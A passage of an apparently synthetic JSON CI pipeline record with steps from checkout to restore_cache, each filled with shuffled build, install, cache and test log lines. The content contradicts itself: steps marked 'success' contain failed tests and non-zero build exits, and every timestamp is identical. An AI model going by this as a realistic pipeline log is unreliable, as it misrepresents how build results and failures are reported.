          "Installing prettier@5.7.0",
          "WARNING: jest has known vulnerabilities",
          "Step 7/10: Building",
          "Installing axios@3.7.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_user_create (284ms)",
          "Cache hit for key-6624",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Installing express@2.7.0",
          "  PASS: test_cache_hit (235ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 8/10: Building",
          "Installing webpack@5.8.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 build completed",
          "WARNING: react has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-1697",
          "\u2713 build completed",
          "Installing lodash@4.12.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "Cache hit for key-1466",
          "Compiling src/utils.go...",
          "Cache hit for key-5542",
          "Cache hit for key-8969",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_auth_login (43ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_auth_login (489ms)",
          "\u2713 test completed",
          "  PASS: test_api_health (153ms)",
          "  PASS: test_db_connect (195ms)",
          "[12:00:26] INFO: Processing request",
          "Exception: ValueError",
          "  PASS: test_auth_login (69ms)",
          "Compiling src/service.java...",
          "Cache hit for key-3459",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/utils.go...",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-6242",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-9073",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-9385",
          "Step 3/10: Building",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Installing webpack@5.16.0",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Installing react@5.2.0",
          "  PASS: test_api_health (176ms)",
          "\u2717 build failed with exit code 82",
          "Cache hit for key-8176",
          "Installing react@1.17.0",
          "[12:00:26] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_api_health (339ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (306ms)",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "  PASS: test_db_connect (186ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Installing eslint@5.13.0",
          "Cache hit for key-2338",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7388",
          "Exception: NullPointerException",
          "[12:00:26] ERROR: Connection failed",
          "  PASS: test_db_connect (268ms)",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-1317",
          "Step 9/10: Building",
          "Installing jest@2.14.0",
          "\u2713 lint completed",
          "Cache hit for key-5885",
          "Installing eslint@2.18.0",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (142ms)",
          "Cache hit for key-6804",
          "Cache hit for key-7489",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (334ms)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-6927",
          "Cache hit for key-9670",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Step 1/10: Building",
          "Installing express@3.19.0",
          "Cache hit for key-1589",
          "Installing react@2.2.0",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-2807",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "WARNING: jest has known vulnerabilities",
          "Installing lodash@5.17.0",
          "Compiling src/handler.rs...",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 10/10: Building",
          "  PASS: test_auth_login (284ms)",
          "Step 9/10: Building",
          "Cache hit for key-5078",
          "Cache hit for key-6051",
          "Cache hit for key-6016",
          "  PASS: test_auth_login (201ms)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@3.19.0",
          "Compiling src/handler.rs...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-29T12:01:07.118087",
        "finished_at": "2025-11-29T12:01:22.656292",
        "log_lines": [
          "=== Step: unit_tests ===",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-6212",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_cache_hit (317ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (326ms)",
          "Step 6/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 7/10: Building",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:26] INFO: Processing request",
          "Installing eslint@2.13.0",
          "Cache hit for key-3840",
          "Cache hit for key-4724",
          "Cache hit for key-6893",
          "Cache hit for key-3184",
          "Compiling src/utils.go...",
          "Installing prettier@2.5.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "FAILED: test_cache_hit",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing express@2.1.0",
          "  PASS: test_user_create (168ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-5231",
          "Cache hit for key-5624",
          "[12:00:26] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-7594",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/app.ts...",
          "Cache hit for key-1095",
          "Compiling src/app.ts...",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] ERROR: Connection failed",
          "  PASS: test_db_connect (54ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (110ms)",
          "  PASS: test_user_create (371ms)",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "Installing express@2.16.0",
          "Cache hit for key-6449",
          "Cache hit for key-3382",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_cache_hit (111ms)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_auth_login (439ms)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Step 2/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-2245",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "Cache hit for key-5866",
          "[12:00:26] INFO: Processing request",
          "Step 5/10: Building",
          "Cache hit for key-6592",
          "  PASS: test_api_health (328ms)",
          "Cache hit for key-4693",
          "Step 2/10: Building",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:26] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "WARNING: react has known vulnerabilities",
          "Installing lodash@3.14.0",
          "Installing eslint@1.13.0",
          "Compiling src/service.java...",
          "[12:00:26] ERROR: Connection failed",
          "Installing eslint@4.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing jest@4.1.0",
          "  PASS: test_auth_login (413ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (410ms)",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (314ms)",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-8895",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_db_connect (487ms)",
          "Step 2/10: Building",
          "Cache hit for key-4602",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "  PASS: test_auth_login (81ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Installing axios@3.15.0",
          "Cache hit for key-2113",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 6/10: Building",
          "Cache hit for key-1737",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7366",
          "Step 8/10: Building",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Exception: NullPointerException",
          "[12:00:26] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (371ms)",
          "Cache hit for key-2640",
          "[12:00:26] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (379ms)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-1199",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_user_create (363ms)",
          "[12:00:26] ERROR: Connection failed",
          "Installing react@3.19.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 2/10: Building",
          "Installing jest@4.1.0",
          "Cache hit for key-2988",
          "\u2713 test completed",
          "Cache hit for key-8366",
          "Compiling src/index.js...",
          "Cache hit for key-2220",
          "Cache hit for key-9412",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-29T12:01:22.656292",
        "finished_at": "2025-11-29T12:01:33.015095",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-2357",
          "Installing eslint@4.12.0",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_cache_hit (282ms)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-4129",
          "\u2713 lint completed",
          "FAILED: test_api_health",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-3282",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-1267",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (331ms)",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "Cache hit for key-7031",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (416ms)",
          "\u2713 lint completed",
          "Step 8/10: Building",
          "  PASS: test_db_connect (216ms)",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@2.8.0",
          "Step 2/10: Building",
          "Step 2/10: Building",
          "\u2713 build completed",
          "  PASS: test_api_health (251ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (207ms)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-4844",
          "Cache hit for key-4757",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7004",
          "  PASS: test_api_health (271ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (384ms)",
          "  PASS: test_db_connect (240ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Cache hit for key-8788",
          "Compiling src/service.java...",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-7337",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-7580",
          "Installing lodash@4.19.0",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (63ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-3817",
          "Step 1/10: Building",
          "Installing lodash@5.8.0",
          "\u2713 lint completed",
          "  PASS: test_db_connect (48ms)",
          "Installing express@5.4.0",
          "Cache hit for key-5923",
          "\u2713 lint completed",
          "Installing prettier@4.11.0",
          "Step 1/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:26] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-2350",
          "Cache hit for key-6136",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Installing jest@3.12.0",
          "\u2713 lint completed",
          "Installing express@2.1.0",
          "[12:00:26] INFO: Processing request",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 119",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-2637",
          "Installing prettier@3.7.0",
          "Compiling src/app.ts...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_user_create (430ms)",
          "  PASS: test_user_create (336ms)",
          "Cache hit for key-9370",
          "Step 3/10: Building",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Step 7/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-1689",
          "  PASS: test_api_health (106ms)",
          "Step 2/10: Building",
          "Cache hit for key-8405",
          "Cache hit for key-5269",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1308",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 build completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (148ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (465ms)",
          "  PASS: test_user_create (228ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (354ms)",
          "Cache hit for key-5657",
          "Step 5/10: Building",
          "[12:00:26] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Exception: TypeError",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-9527",
          "Step 8/10: Building",
          "Cache hit for key-3499",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "Installing axios@5.2.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing express@3.20.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "Installing webpack@4.15.0",
          "  PASS: test_api_health (253ms)",
          "FAILED: test_auth_login",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Cache hit for key-2263",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Exception: ValueError",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-7897",
          "Cache hit for key-4796",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Compiling src/service.java...",
          "FAILED: test_api_health",
          "  PASS: test_user_create (220ms)",
          "Step 8/10: Building",
          "Cache hit for key-9932",
          "Cache hit for key-1615",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-29T12:01:33.015095",
        "finished_at": "2025-11-29T12:01:38.194497",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "\u2713 build completed",
          "[12:00:26] WARN: Deprecated API usage",
          "  PASS: test_auth_login (182ms)",
          "FAILED: test_cache_hit",
          "  PASS: test_cache_hit (94ms)",
          "Step 6/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Installing eslint@3.8.0",
          "\u2713 lint completed",
          "Installing express@3.13.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Cache hit for key-4668",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: NullPointerException",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 10/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7259",
          "\u2713 test completed",
          "Installing jest@3.13.0",
          "Installing jest@1.19.0",
          "  PASS: test_api_health (343ms)",
          "Installing webpack@2.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing axios@4.11.0",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-4343",
          "Installing jest@1.0.0",
          "Cache hit for key-6235",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 50",
          "[12:00:26] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-7871",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 7/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-7328",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "Compiling src/index.js...",
          "Installing eslint@3.11.0",
          "Installing jest@2.4.0",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "Step 2/10: Building",
          "Installing express@2.1.0",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_db_connect (277ms)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (352ms)",
          "Cache hit for key-8806",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Installing eslint@4.9.0",
          "Compiling src/main.py...",
          "  PASS: test_api_health (333ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-1086",
          "  PASS: test_user_create (23ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 10/10: Building",
          "[12:00:26] ERROR: Connection failed",
          "Installing lodash@2.1.0",
          "Cache hit for key-2356",
          "[12:00:26] INFO: Processing request",
          "Installing axios@4.19.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 2/10: Building",
          "Installing eslint@3.9.0",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:26] INFO: Processing request",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-2450",
          "Cache hit for key-5916",
          "WARNING: react has known vulnerabilities",
          "Installing eslint@2.8.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Cache hit for key-4799",
          "Step 2/10: Building",
          "Installing express@3.13.0",
          "Step 5/10: Building",
          "[12:00:26] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "FAILED: test_db_connect",
          "  PASS: test_cache_hit (216ms)",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "Installing react@1.6.0",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-2193",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing prettier@4.17.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-5813",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_db_connect (429ms)",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Installing prettier@3.1.0",
          "\u2713 lint completed",
          "Cache hit for key-1867",
          "\u2713 lint completed",
          "Installing prettier@5.16.0",
          "  PASS: test_cache_hit (299ms)",
          "\u2713 lint completed",
          "Cache hit for key-2614",
          "Installing lodash@3.19.0",
          "Installing react@5.4.0",
          "Installing react@2.9.0",
          "Installing react@2.9.0",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-3997",
          "[12:00:26] INFO: Processing request",
          "Installing eslint@1.0.0",
          "\u2713 build completed",
          "  PASS: test_api_health (187ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (160ms)",
          "WARNING: express has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-6226",
          "Step 4/10: Building",
          "  PASS: test_db_connect (28ms)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-29T12:01:38.194497",
        "finished_at": "2025-11-29T12:01:41.302138",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Cache hit for key-9834",
          "Cache hit for key-5929",
          "Installing react@5.6.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing jest@3.9.0",
          "  PASS: test_api_health (476ms)",
          "  PASS: test_auth_login (445ms)",
          "Installing prettier@1.20.0",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (158ms)",
          "Compiling src/main.py...",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_db_connect (461ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:26] INFO: Processing request",
          "Step 8/10: Building",
          "Installing jest@4.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-1289",
          "  PASS: test_auth_login (442ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-1714",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (469ms)",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-9455",
          "Cache hit for key-1748",
          "Cache hit for key-6284",
          "Step 1/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing react@1.15.0",
          "Cache hit for key-5420",
          "Step 8/10: Building",
          "[12:00:26] WARN: Deprecated API usage",
          "Step 8/10: Building",
          "Cache hit for key-5853",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-1404",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-8181",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (214ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing axios@5.20.0",
          "Step 8/10: Building",
          "  PASS: test_auth_login (249ms)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_auth_login (70ms)",
          "  PASS: test_db_connect (232ms)",
          "  PASS: test_db_connect (459ms)",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Installing lodash@2.11.0",
          "  PASS: test_user_create (456ms)",
          "Installing lodash@5.13.0",
          "Cache hit for key-9979",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing webpack@5.19.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Step 5/10: Building",
          "[12:00:26] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 3/10: Building",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "\u2717 build failed with exit code 100",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "Installing lodash@4.9.0",
          "  PASS: test_api_health (4ms)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "\u2713 test completed",
          "Cache hit for key-4574",
          "[12:00:26] WARN: Deprecated API usage",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_auth_login (365ms)",
          "  PASS: test_cache_hit (31ms)",
          "\u2713 build completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "[12:00:26] ERROR: Connection failed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Installing react@1.3.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_auth_login (464ms)",
          "Exception: RuntimeError",
          "  PASS: test_cache_hit (348ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Installing webpack@3.15.0",
          "  PASS: test_user_create (321ms)",
          "Step 3/10: Building",
          "Installing prettier@2.0.0",
          "  PASS: test_db_connect (14ms)",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (76ms)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (192ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-4927",
          "Cache hit for key-2414",
          "  PASS: test_user_create (421ms)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (439ms)",
          "Cache hit for key-7320",
          "Installing prettier@3.9.0",
          "[12:00:26] INFO: Processing request",
          "Installing eslint@3.16.0",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "WARNING: prettier has known vulnerabilities",
          "Installing webpack@2.11.0",
          "Artifact uploaded: build.tar.gz (3MB)",
